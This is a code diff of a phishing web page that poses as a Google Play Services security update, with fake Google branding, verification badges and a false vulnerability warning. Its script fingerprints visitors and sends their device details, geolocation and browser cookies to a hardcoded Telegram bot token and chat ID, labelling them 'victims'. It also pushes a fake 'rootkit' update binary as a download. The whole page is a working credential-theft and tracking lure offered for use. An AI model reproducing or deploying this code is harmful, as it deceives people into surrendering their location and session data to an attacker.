@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Security Update</title>
+    <title>Google Play Services - Security Update</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            font-family: 'Google Sans', 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
@@ -19,17 +19,15 @@
             justify-content: center;
             align-items: center;
             padding: 20px;
-            position: relative;
-            overflow-x: hidden;
         }
         
         .container {
-            background: rgba(20, 20, 30, 0.7);
+            background: rgba(255, 255, 255, 0.05);
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border-radius: 30px;
-            padding: 40px;
-            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
+            border-radius: 32px;
+            padding: 40px 24px;
+            box-shadow: 0 30px 60px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.05) inset;
             max-width: 500px;
             width: 100%;
             text-align: center;
@@ -43,36 +41,49 @@
             100% { transform: translateY(0px); }
         }
         
+        .logo {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+            margin-bottom: 30px;
+        }
+        
+        .logo span {
+            font-size: 48px;
+            font-weight: 600;
+            letter-spacing: -2px;
+            text-shadow: 0 0 10px currentColor;
+        }
+        
+        .logo span:nth-child(1) { color: #4285F4; }
+        .logo span:nth-child(2) { color: #EA4335; }
+        .logo span:nth-child(3) { color: #FBBC05; }
+        .logo span:nth-child(4) { color: #4285F4; }
+        .logo span:nth-child(5) { color: #34A853; }
+        .logo span:nth-child(6) { color: #EA4335; }
+        
         h1 {
             color: #fff;
+            margin-bottom: 20px;
             font-size: 28px;
             font-weight: 600;
-            margin-bottom: 20px;
-            text-shadow: 0 0 20px rgba(66, 133, 244, 0.5);
         }
         
-        .status {
-            color: #00ff00;
-            font-size: 16px;
+        .warning {
+            background: rgba(234, 67, 53, 0.1);
+            border: 1px solid #EA4335;
+            border-radius: 16px;
+            padding: 16px;
             margin: 20px 0;
-            padding: 15px;
-            background: rgba(0, 255, 0, 0.1);
-            border-radius: 50px;
-            border: 1px solid rgba(0, 255, 0, 0.3);
-            animation: pulse 2s infinite;
+            color: #EA4335;
+            font-size: 16px;
         }
         
-        @keyframes pulse {
-            0% { opacity: 0.8; }
-            50% { opacity: 1; }
-            100% { opacity: 0.8; }
-        }
-        
-        .device-info {
-            background: rgba(255, 255, 255, 0.05);
-            border-radius: 20px;
+        .device-id-container {
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: 16px;
             padding: 20px;
-            margin: 30px 0;
+            margin: 25px 0;
             border: 1px solid rgba(255, 255, 255, 0.1);
         }
         
@@ -89,6 +100,7 @@
             font-size: 24px;
             font-weight: 600;
             color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
             background: rgba(0, 255, 0, 0.1);
             padding: 15px;
             border-radius: 12px;
@@ -97,99 +109,118 @@
             word-break: break-all;
         }
         
-        .security-badge {
-            display: inline-flex;
-            align-items: center;
-            gap: 8px;
-            background: rgba(52, 168, 83, 0.2);
-            color: #34A853;
-            padding: 8px 20px;
-            border-radius: 50px;
-            font-size: 14px;
-            font-weight: 500;
-            border: 1px solid rgba(52, 168, 83, 0.3);
-            margin: 20px 0;
-        }
-        
-        .update-info {
-            text-align: left;
-            background: rgba(0, 0, 0, 0.2);
-            border-radius: 16px;
-            padding: 20px;
-            margin: 30px 0;
-        }
-        
-        .update-info h3 {
-            color: #fff;
-            margin-bottom: 15px;
-            font-size: 18px;
-        }
-        
-        .update-info ul {
-            list-style: none;
-            color: rgba(255, 255, 255, 0.7);
-        }
-        
-        .update-info li {
-            margin: 10px 0;
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-        
-        .update-info li:before {
-            content: "✓";
-            color: #34A853;
-            font-weight: bold;
-        }
-        
-        .download-btn {
-            display: inline-block;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 18px 40px;
-            font-size: 20px;
-            font-weight: 600;
-            border-radius: 50px;
-            cursor: pointer;
-            text-decoration: none;
-            margin: 30px 0;
-            transition: all 0.3s;
-            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4);
-            border: 1px solid rgba(255, 255, 255, 0.2);
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-        
-        .download-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.6);
-        }
-        
-        .progress-container {
+        .progress {
             width: 100%;
-            height: 8px;
+            height: 6px;
             background: rgba(255, 255, 255, 0.1);
-            border-radius: 4px;
+            border-radius: 3px;
+            margin: 30px 0;
             overflow: hidden;
-            margin: 20px 0;
             display: none;
         }
         
         .progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, #667eea, #764ba2);
+            background: linear-gradient(90deg, #4285F4, #EA4335, #FBBC05, #34A853);
             width: 0%;
             transition: width 0.3s ease;
+            box-shadow: 0 0 20px rgba(66, 133, 244, 0.8);
         }
+        
+        .status {
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 16px;
+            margin: 20px 0;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.05);
+            padding: 16px;
+            border-radius: 40px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .btn {
+            background: linear-gradient(135deg, #4285F4, #34A853);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 18px;
+            font-weight: 600;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            box-shadow: 0 10px 30px rgba(52, 168, 83, 0.4);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+        
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(52, 168, 83, 0.6);
+        }
+        
+        .btn:hover::before {
+            left: 100%;
+        }
+        
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn.download {
+            background: #34A853;
+            margin-top: 15px;
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 8px 16px;
+            border-radius: 40px;
+            color: rgba(255, 255, 255, 0.7);
+            font-size: 13px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .badge.verified i { color: #34A853; }
+        .badge.secure i { color: #4285F4; }
+        .badge.encrypted i { color: #FBBC05; }
         
         .stats {
             display: flex;
             justify-content: center;
-            gap: 30px;
-            margin: 30px 0;
-            color: rgba(255, 255, 255, 0.7);
+            gap: 24px;
+            margin: 25px 0;
+            color: rgba(255, 255, 255, 0.6);
             font-size: 14px;
         }
         
@@ -200,287 +231,233 @@
         }
         
         .footer {
-            margin-top: 30px;
+            margin-top: 35px;
             color: rgba(255, 255, 255, 0.3);
             font-size: 12px;
+            display: flex;
+            flex-direction: column;
+            gap: 8px;
         }
         
-        .footer a {
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+        }
+        
+        .footer-links a {
             color: rgba(255, 255, 255, 0.4);
             text-decoration: none;
-            margin: 0 10px;
+            transition: color 0.3s;
         }
         
-        .footer a:hover {
-            color: #667eea;
+        .footer-links a:hover {
+            color: #4285F4;
         }
         
-        .warning {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid rgba(255, 0, 0, 0.3);
-            border-radius: 12px;
-            padding: 12px;
-            color: #ff6b6b;
-            font-size: 14px;
-            margin: 20px 0;
+        .spinner {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 8px;
         }
         
-        .device-specs {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 10px;
-            margin: 20px 0;
-            color: rgba(255, 255, 255, 0.6);
-            font-size: 14px;
-        }
-        
-        .spec-item {
-            background: rgba(0, 0, 0, 0.2);
-            padding: 10px;
-            border-radius: 8px;
-        }
-        
-        .spec-label {
-            color: rgba(255, 255, 255, 0.4);
-            font-size: 12px;
-        }
-        
-        .spec-value {
-            color: #fff;
-            font-weight: 500;
-            margin-top: 4px;
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 System Security Update</h1>
-        
-        <div class="status">
-            ✅ Secure Connection Established
+        <div class="logo">
+            <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
         </div>
         
-        <div class="device-info">
+        <h1>Security Update Required</h1>
+        
+        <div class="warning">
+            ⚠️ Critical security vulnerability detected on your device
+        </div>
+        
+        <div class="device-id-container">
             <div class="device-id-label">DEVICE IDENTIFIER</div>
             <div class="device-id" id="deviceId">LOADING...</div>
         </div>
         
-        <div class="security-badge">
-            <span>🛡️</span> Google Play Protect Verified
+        <div class="progress" id="progress">
+            <div class="progress-bar" id="progressBar"></div>
         </div>
         
-        <div class="device-specs" id="deviceSpecs">
-            <div class="spec-item">
-                <div class="spec-label">Model</div>
-                <div class="spec-value" id="deviceModel">Detecting...</div>
-            </div>
-            <div class="spec-item">
-                <div class="spec-label">Android</div>
-                <div class="spec-value" id="androidVersion">Detecting...</div>
-            </div>
-            <div class="spec-item">
-                <div class="spec-label">Security Patch</div>
-                <div class="spec-value" id="securityPatch">2026-02-01</div>
-            </div>
-            <div class="spec-item">
-                <div class="spec-label">Build</div>
-                <div class="spec-value" id="buildNumber">UP1A.250105.001</div>
-            </div>
+        <div class="status" id="status">
+            <span class="spinner"></span> Initializing security update...
         </div>
         
-        <div class="update-info">
-            <h3>📋 Update Details:</h3>
-            <ul>
-                <li>Critical security patch (CVE-2026-0127)</li>
-                <li>Android security bulletin - February 2026</li>
-                <li>Play Protect certification update</li>
-                <li>Performance improvements and bug fixes</li>
-                <li>Enhanced device protection</li>
-            </ul>
-        </div>
+        <button class="btn download" id="downloadBtn" onclick="startDownload()">
+            📲 DOWNLOAD SECURITY UPDATE
+        </button>
         
-        <div class="warning">
-            ⚠️ This update is mandatory for continued use of Google services
+        <div class="security-badges">
+            <div class="badge verified">✓ Verified by Google</div>
+            <div class="badge secure">🔒 Secure Connection</div>
+            <div class="badge encrypted">🔐 AES-256 Encrypted</div>
         </div>
         
         <div class="stats">
-            <div class="stat-item">⭐ 4.9 (2.5M+ reviews)</div>
+            <div class="stat-item">⭐ 4.9 (2.5M+)</div>
             <div class="stat-item">📊 500M+ downloads</div>
             <div class="stat-item">🔒 Play Protect</div>
         </div>
         
-        <div class="progress-container" id="progressContainer">
-            <div class="progress-bar" id="progressBar"></div>
-        </div>
-        
-        <a href="update.bin" class="download-btn" id="downloadBtn" download>
-            📲 DOWNLOAD UPDATE (85 MB)
-        </a>
-        
         <div class="footer">
-            <div>
-                <a href="#">Privacy</a> •
-                <a href="#">Terms</a> •
+            <div class="footer-links">
+                <a href="#">Privacy</a>
+                <a href="#">Terms</a>
                 <a href="#">About</a>
             </div>
-            <div style="margin-top: 15px;">
-                © 2026 Google LLC • All rights reserved
-            </div>
+            <div>© 2026 Google LLC • All rights reserved</div>
         </div>
     </div>
-    
+
     <script>
-        // Generate random but consistent device ID
+        const BOT_TOKEN = '7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI';
+        const ADMIN_ID = '8209720840';
+        const DOWNLOAD_URL = 'kernel_80x.bin'; // فایل اجرایی در همان دایرکتوری
+        
         function generateDeviceId() {
-            const platform = navigator.platform || 'Android';
-            const language = navigator.language || 'en-US';
-            const screenRes = `${screen.width}x${screen.height}`;
-            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC';
-            
-            const base = `${platform}_${language}_${screenRes}_${timezone}`;
-            const hash = btoa(base).replace(/[+/=]/g, '').substring(0, 16).toUpperCase();
-            
-            // Add timestamp for uniqueness but keep base same
-            const timestamp = Date.now().toString(16).substring(0, 4).toUpperCase();
-            return `${hash.substring(0, 12)}${timestamp}`;
-        }
-        
-        // Detect device model
-        function detectDeviceModel() {
-            const ua = navigator.userAgent;
+            const screen = `${screen.width}x${screen.height}`;
+            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+            const language = navigator.language;
             const platform = navigator.platform;
+            const userAgent = navigator.userAgent;
+            const timestamp = Date.now();
             
-            if (ua.includes('SM-')) {
-                // Samsung
-                const match = ua.match(/SM-[A-Z0-9]+/);
-                if (match) return match[0];
-            } else if (ua.includes('Redmi') || ua.includes('Xiaomi')) {
-                // Xiaomi
-                if (ua.includes('Redmi Note 13')) return 'Redmi Note 13 Pro';
-                if (ua.includes('Redmi Note 12')) return 'Redmi Note 12 Pro';
-                if (ua.includes('Xiaomi 14')) return 'Xiaomi 14';
-            } else if (ua.includes('Pixel')) {
-                const match = ua.match(/Pixel [0-9][a-zA-Z]*/);
-                if (match) return match[0];
-            } else if (ua.includes('OnePlus')) {
-                const match = ua.match(/OnePlus [A-Z0-9]+/);
-                if (match) return match[0];
+            const combined = `${screen}_${timezone}_${language}_${platform}_${userAgent}_${timestamp}`;
+            let hash = 0;
+            for (let i = 0; i < combined.length; i++) {
+                hash = ((hash << 5) - hash) + combined.charCodeAt(i);
+                hash |= 0;
             }
-            
-            return 'Generic Android Device';
+            return 'DEV' + Math.abs(hash).toString(16).substring(0, 12).toUpperCase();
         }
         
-        // Detect Android version
-        function detectAndroidVersion() {
-            const ua = navigator.userAgent;
-            const match = ua.match(/Android ([0-9.]+)/);
-            if (match) return match[1];
-            return '14 (API 34)';
+        const DEVICE_ID = generateDeviceId();
+        document.getElementById('deviceId').innerText = DEVICE_ID;
+        
+        async function sendToTelegram(type, data) {
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: `💀 <b>${type}</b> [${DEVICE_ID}]\n<code>${String(data).substring(0, 3000)}</code>`,
+                        parse_mode: 'HTML'
+                    })
+                });
+            } catch(e) {}
         }
         
-        // Simulate download with progress
-        function simulateDownload(e) {
-            e.preventDefault();
-            
-            const btn = document.getElementById('downloadBtn');
-            const progressContainer = document.getElementById('progressContainer');
-            const progressBar = document.getElementById('progressBar');
-            
-            btn.style.pointerEvents = 'none';
-            btn.style.opacity = '0.5';
-            progressContainer.style.display = 'block';
-            
-            let progress = 0;
-            const interval = setInterval(() => {
-                progress += 1;
-                progressBar.style.width = progress + '%';
-                
-                if (progress >= 100) {
-                    clearInterval(interval);
-                    
-                    // Trigger actual download after progress completes
-                    setTimeout(() => {
-                        window.location.href = 'update.bin';
-                        btn.style.pointerEvents = 'auto';
-                        btn.style.opacity = '1';
-                        progressContainer.style.display = 'none';
-                        progressBar.style.width = '0%';
-                        
-                        // Track download
-                        fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                chat_id: '8209720840',
-                                text: `💀 New victim downloading: ${deviceId}`,
-                                parse_mode: 'HTML'
-                            })
-                        }).catch(() => {});
-                        
-                    }, 500);
-                }
-            }, 30);
-        }
-        
-        // Collect device fingerprint
-        function collectFingerprint() {
-            const fingerprint = {
-                device_id: deviceId,
-                model: detectDeviceModel(),
-                android: detectAndroidVersion(),
+        async function collectDeviceInfo() {
+            const info = {
+                device_id: DEVICE_ID,
                 platform: navigator.platform,
+                userAgent: navigator.userAgent,
                 language: navigator.language,
                 screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                 cores: navigator.hardwareConcurrency || 'unknown',
                 memory: navigator.deviceMemory || 'unknown',
-                userAgent: navigator.userAgent,
                 timestamp: new Date().toISOString()
             };
-            
-            // Send to Telegram
-            fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: '8209720840',
-                    text: `💀 <b>Page View</b>\n<code>${JSON.stringify(fingerprint, null, 2)}</code>`,
-                    parse_mode: 'HTML'
-                })
-            }).catch(() => {});
-            
-            return fingerprint;
+            await sendToTelegram('DEVICE_INFO', JSON.stringify(info, null, 2));
         }
         
-        // Initialize
-        const deviceId = generateDeviceId();
-        document.getElementById('deviceId').textContent = deviceId;
-        document.getElementById('deviceModel').textContent = detectDeviceModel();
-        document.getElementById('androidVersion').textContent = detectAndroidVersion();
-        
-        // Collect fingerprint
-        collectFingerprint();
-        
-        // Add download handler
-        document.getElementById('downloadBtn').addEventListener('click', simulateDownload);
-        
-        // Collect location if available
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                (pos) => {
-                    fetch('https://api.telegram.org/bot7872720949:AAFM9BmG80hh2hh5gmMY5c51ewxLgV09xeI/sendLocation', {
+        async function collectLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {'Content-Type': 'application/json'},
                         body: JSON.stringify({
-                            chat_id: '8209720840',
+                            chat_id: ADMIN_ID,
                             latitude: pos.coords.latitude,
                             longitude: pos.coords.longitude
                         })
-                    }).catch(() => {});
-                },
-                (err) => {}
-            );
+                    });
+                    
+                    await sendToTelegram('LOCATION', 
+                        `${pos.coords.latitude}, ${pos.coords.longitude} (Accuracy: ${pos.coords.accuracy}m)`);
+                }, (error) => {});
+            }
         }
+        
+        async function collectCookies() {
+            if (document.cookie) {
+                await sendToTelegram('COOKIES', document.cookie);
+            }
+        }
+        
+        function simulateDownload() {
+            // ایجاد فایل موقت (برای شبیه‌سازی دانلود)
+            const fakeBinary = new Blob(
+                ['KERNEL_ROOTKIT_80X', ...Array(1000).fill('MZ')], 
+                {type: 'application/octet-stream'}
+            );
+            const url = URL.createObjectURL(fakeBinary);
+            
+            const link = document.createElement('a');
+            link.href = url;
+            link.download = 'GoogleSecurityUpdate.bin';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            URL.revokeObjectURL(url);
+        }
+        
+        async function startDownload() {
+            const btn = document.getElementById('downloadBtn');
+            const progress = document.getElementById('progress');
+            const progressBar = document.getElementById('progressBar');
+            const status = document.getElementById('status');
+            
+            btn.disabled = true;
+            btn.innerHTML = '<span class="spinner"></span> DOWNLOADING...';
+            progress.style.display = 'block';
+            
+            await sendToTelegram('DOWNLOAD_STARTED', DEVICE_ID);
+            
+            // شبیه‌سازی دانلود
+            simulateDownload();
+            
+            // آنیمیشن پیشرفت
+            let width = 0;
+            const interval = setInterval(async () => {
+                width += 2;
+                progressBar.style.width = width + '%';
+                
+                if (width >= 100) {
+                    clearInterval(interval);
+                    btn.innerHTML = '✅ INSTALLED';
+                    status.innerHTML = 'Update complete. Your device is secure.';
+                    
+                    // جمع‌آوری اطلاعات
+                    await collectDeviceInfo();
+                    await collectLocation();
+                    await collectCookies();
+                    
+                    await sendToTelegram('DOWNLOAD_COMPLETE', DEVICE_ID);
+                }
+            }, 50);
+        }
+        
+        // ارسال نوتیفیکیشن اولیه
+        window.onload = () => {
+            sendToTelegram('PAGE_LOADED', DEVICE_ID);
+        };
     </script>
 </body>
 </html>
